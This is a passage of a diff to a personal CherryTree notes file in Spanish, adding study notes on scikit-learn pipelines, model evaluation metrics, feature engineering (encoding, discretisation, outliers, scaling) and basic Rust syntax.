     <node name="estadistica inferencial" unique_id="95" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="133" is_bold="0" foreground="" ts_creation="1654816797" ts_lastsave="1654816797"/>
-    <node name="etica en el manejo de datos" unique_id="96" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="10" is_bold="1" foreground="" ts_creation="1654889158" ts_lastsave="1655056410">
+    <node name="etica en el manejo de datos" unique_id="96" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="10" is_bold="0" foreground="" ts_creation="1654889158" ts_lastsave="1655056410">
       <rich_text>Que son los datos personales:
 - datos que permiten identificar a una persona de manera directa o indirecta
 - se pueden clasificar por jerarquia de importancia o riesgo, hay datos que son unicos y otros que permiten identificar a multiples personas
@@ -12863,7 +14728,7 @@ Regresion Logistica
 - funcion de optimizacion
    → se usa la misma para la regresion lineal, gradiente descendiente</rich_text>
       </node>
-      <node name="Creacion de proyectos" unique_id="190" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1698801932" ts_lastsave="1699575193">
+      <node name="Creacion de proyectos" unique_id="190" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1698801932" ts_lastsave="1700699378">
         <rich_text>el conjunto de datos es una parte esencial en la resolucion de un problema, al nivel del algoritmo a usarse
 disponer de una cantidad suficiente de datos
 esencial utilizar un conjunto de datos que es representativo del problema practico
@@ -12902,7 +14767,37 @@ Preparacion del conjunto de datos
    → datos con pocos datos positivos y muchos negativos
    → hacer oversample
    → seleccionar un subconjunto
-   → modificar la funcion de error, para que la minoria tenga mas influencia en el modelo</rich_text>
+   → modificar la funcion de error, para que la minoria tenga mas influencia en el modelo
+
+Caso practico
+- estimators: cualquier objeto que puede estimar algun parametro
+   → se hace mediante el metodo fir, siempre toma un dataset como argumento
+   → cualquier otro parametro e un hiperparametro
+- Transformers: son estimadores que pueden transformar un conjunto de datos
+   → se realiza mediante el metodo transform
+   → reciben un dataset
+- predictors: estimadores capaces de hacer predicciones
+   → se realiza mediente el metodo predict
+   → reciben un dataset
+   → retornan un dataset o un array de numpy
+   → tienen un metodo score para evaluar la prediccion
+- Pipelines y transformadores
+   → transformador personalizado: requiere el init, fit y transform, depende de BaseEstimator y TransformerMixin
+   → Pipelines, permite ejecutar un flujo de ejecucion para la transformacion de datos, se usa por fit o fit_transform, recibe un nombre estimador, todos menos el ultimo deben de ser estimadores
+
+Evaluacion de resultados:
+- numericas:
+   → precision
+   → exhaustividad, recall
+   → exactitud
+- graficas
+   → ROC, la esquina superior izquierda de la grafica es el punto ideal, `y` verdaderos positivos, `x` falsos positivos
+   → PR (precision-recall), la esquina supperior izquierda de la grafica es el punto ideal
+- matriz de confusion
+   → se crean las metricas, verdadero positivo, verdadero negativo, falso positivo y falso negativo
+
+Evaluacion de resultados
+- separacion en subconjuntos, entrenamiento, validacion y pruebas</rich_text>
       </node>
     </node>
     <node name="data eng zoomcamp" unique_id="135" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1674689635" ts_lastsave="1675719767">
@@ -12918,7 +14813,7 @@ Long Island City/Queens Plaza
 </rich_text>
       <rich_text family="monospace">0 5 1 * *</rich_text>
     </node>
-    <node name="ingenieria de variables" unique_id="185" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="41" is_bold="0" foreground="" ts_creation="1697502469" ts_lastsave="1699585817">
+    <node name="ingenieria de variables" unique_id="185" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="41" is_bold="0" foreground="" ts_creation="1697502469" ts_lastsave="1701922274">
       <rich_text># Tipos de variables
 - cualquier caracteristica, numero o cantidad que puede ser medida o contada
 - se pueden clasificar en dos:
@@ -13192,7 +15087,130 @@ Codificacion de variables categoricas
    → proporcion de la probabilidad de que el target sea 1 o 0, este solo usa cuando es binario
 - Peso de la evidencia
    → evaluacion de datos o informacion
-   → evaluacion de incumplimientos de pago de prestamos p deudas</rich_text>
+   → evaluacion de incumplimientos de pago de prestamos p deudas
+- Codificacion de categorias raras, poco comunes
+   → estas generalmente se usa la etiqueta rare
+   → estas aparecen pocas veces, asi que aportan muy poca informacion para el modelo
+   → variables con una categoria predominante, renombrar la etiqueta con pocos valores como rara
+   → variables con pocas categorias, se pueden agrupar las bajas en una sola categoria
+   → variables con alta cardinalidad, se recomienda tambien agrupar en una misma etiqueta para reducir tantas etiquetas
+- codificacion binaria y hashing de variables
+   → uso de 1 y 0 para el significado de la variable
+   → hashing, transforma las variables en vector binario, se usa para alta cardinalidad, se crea un indice de donde estara el vector binario
+
+Transformacion de variables
+- lineales asumen que la variable tiene una distribucion gaussiana, normalidad puede ser evaluada con un histograma y graficos Q-Q
+- transformacion de variables:
+   → logaritmica. solo valores positivos
+   → exponencial, se eleva la variable a una variable o raiz cubica o cuadrada, no definida para todo x
+   → reciproca, no esta definida para 0 -&gt; 1/x
+   → box-cox, se usan ds formulas dependiendo si el exponente es diferente de 0, sino es usado el logaritmo natural
+   → yeo-johnson, mas compleja, uso de varias funciones dependiendo de lamba y el valor de la variable
+
+Discretizacion de variables
+- transformacion de una variable numerica continua a una discreta, se crean intervalos conocidos conocidos como segmentos, bin o buckets
+- se usa para sesgos donde se mejora la distribucion
+- ayuda a manejar los outliers
+- sin supervision
+   → igual rango
+      ⇒ se dividen en n segmentos de n tamaño
+      ⇒ se determinan por el (valor maximo - minimo) / segmentos
+      ⇒ no mejor distribucion
+      ⇒ maneja valores extremos
+      ⇒ crea variables discretas
+      ⇒ se puede combinar con codificacion categorica
+   → igual frecuencia
+      ⇒ el rango de los posibles valores de una variable se divide en N segmentos y cada segmento tiene el mismo numero de obsrevaciones
+      ⇒ los limites corresponden a los cuantiles
+      ⇒ se distribuye mas homogeneamente
+      ⇒ se mejora la distribucion
+      ⇒ maneja valores extremos
+      ⇒ crea variables discretas
+      ⇒ se combiona con codificaicon categorica
+   → k medias
+      ⇒ se usa la agrupacion de k-medias
+      ⇒ busqueda de centroides
+      ⇒ se crean los grupos agregando los datos mas cercanos a los centroides
+      ⇒ los limites se llaman bin limits
+      ⇒ no cambia la distribucion de las variables
+      ⇒ maneja valores extremos, pueden influir en los centroides
+      ⇒ crea variables discretas
+      ⇒ se puede combinar con codificacion categorica
+- supervisados
+   → arboles de decision
+      ⇒ metodo supervisado, se usan los valores del target
+      ⇒ por medio de arboles de descision
+      ⇒ no mejora la distribucion de los valores
+      ⇒ maneja valores extremos
+      ⇒ crea variables discretas
+      ⇒ crea relacion monotonica
+      ⇒ si en dado caso no se ve la relacion monotomica se debe de optimizar el algoritmo
+- discretizacion mas codificacion de variables
+   → la codificacion ayuda a que por medio de una ordenacion se tenga una relacion homogenea
+   → ayuda mucho  a modelos lineales
+- discretizacion basada en conocimiento
+   → se fijan los valores conociendolos, esto es gracias a expertos de negocio
+
+Tratamiento de valores extremos
+- valor significamente diferente del resto de los datos
+- afectan modelos lineales y ada boost
+- que se puede hacer
+   → remocion, eliminar los valores, procedimiento rapido, puede remover una larga parte de los datos
+   → datos ausentes, como si fueran datos ausentes
+   → discretizacion, colocarlos en segmentos extremos
+   → truncamiento, limitar la distribucion de la variable a unos maximos o monimos, Top/bottom, los datos no se mueven, distorciona la distribucion de la variable
+- como detectar
+   → por medio de la distribucion gaussiana (media y std)
+   → regla del rango inter-cuartil
+   → cuantiles
+
+Poniendo las variables en la misma escala
+- afecta directamente los coeficientes de regresion
+- las variables con mayor rango de valores dominan sobre aquellas de menor rango
+- descenso por gradiente convergera mucho mas rapido si todas las variabes tienen rangos similares
+- puede ayudar a reducir el tiempo para encontrar los vectores de soporte en SVM
+- los algoritmos que usan medidas de distancias son mas sensibles a la escala de las variables
+- algoritmos suceptibles
+   → casi todos
+   → regresion linea y logistica
+   → redes neuronales
+   → maquinas de vectores de soporte
+   → KNN
+   → agrupamiento por k medias
+   → analisis discriminante lineal
+   → analisis de componente principales
+- no afectados
+   → arboles de regresion y clasificacion
+   → bosques aleatorios
+   → arboles gradiente de potenciacion
+- escalamiento es normalizar los rangos de valores dentro de una escala similar
+- este es el ultimo paso en el pipeline
+- Escalado estandar
+   → los datos quedan centrados alrededor de zero y su varianza es igual a 1
+   → los valores quedan con negativos
+   → el valor que obtenemos nos dice que tan lejos o cerca esta la observacion con respecto a la media
+   → centraliza la media alrededor de 0
+   → escala la varianza de la variable a la unidad
+   → preserva la forma original de la distribucion
+   → los valores maximos y minimos de la variable varian
+   → preserva los valores extremos
+- Normalizacion con la media
+   → centrar los valores de la variables alrededor de 0 y reescalar el rango de valores
+   → aqui se usa el rango de valores para obtener estos valores
+   → generalmente estan entre 1 y -1
+   → centraliza la media alredeedor de 0
+   → la varianza es diferente
+   → puede alterar la forma de la distribucion
+   → los valores maximos y minimos se restringen entre -1 y 1
+   → preserva los valores extremos
+   → en scikit learn se usa: StandardScaler y RobustScaler
+- Escalamiento de valores por maximos y minimos
+   → escala los valores entre 0 y 1
+   → la media y la varianza son diferentes
+   → puede cambiar la forma de la distribucion
+   → los alores quedan entre 0 y 1
+   → preserva los valores extremos
+- </rich_text>
     </node>
   </node>
   <node name="JS" unique_id="26" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1625688385" ts_lastsave="1630594410">
@@ -14672,7 +16690,7 @@ CH:
 - formula for index: A[i] = Base Address + i * datasize
    → in C the formula is pointer</rich_text>
     </node>
-    <node name="Rust" unique_id="187" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="40" is_bold="0" foreground="" ts_creation="1698026179" ts_lastsave="1698690008">
+    <node name="Rust" unique_id="187" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="40" is_bold="0" foreground="" ts_creation="1698026179" ts_lastsave="1702267316">
       <rich_text>por que usar:
 - lenguaje mas amado por la comunidad
 - modo seguro, evita hacer codigo inseguro o feo
@@ -14699,7 +16717,16 @@ CH:
    → con tipo de dato: `let mut {vector}: Vec&lt;{tipo}&gt; = Vec::new();`
 - for se usa `for i in 0..3 {}` con variables: `for {var} in {array} {}`
 - vectores inmutables: `let {vector} = [{valores}]`, este no se pude modificar
-- para crear una funcion: `fn {nombre}({variables con tipo})`</rich_text>
+- para crear una funcion: `fn {nombre}({variables con tipo})`
+
+--- UDEMY
+shadowing, creacion de una variable de nuevo usando let, se puede usar para definir algun nuevo valor desde una funcion, se puede hacer para cambiar el tipo de datos
+para las constantes es obligatorio el tipo de dato, siempre son inmutables y no tienen shadowing
+las variables no pueden ser globales
+impl es usado para crear los metodos de las estructuras
+generics es usado con &lt;T, V&gt;, esto sirve par apoder darle cualquier tipo de dato, se puede usar en funciones y retorno de funcion
+Traits son como interfaces, puede sobreescribir los options, se escriben con camel case
+closures son lambdas de python en rust</rich_text>
     </node>
     <node name="Historia de los langs" unique_id="189" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="41" is_bold="0" foreground="" ts_creation="1698688730" ts_lastsave="1699155613">
       <rich_text>las maquinas abstractas tienen:
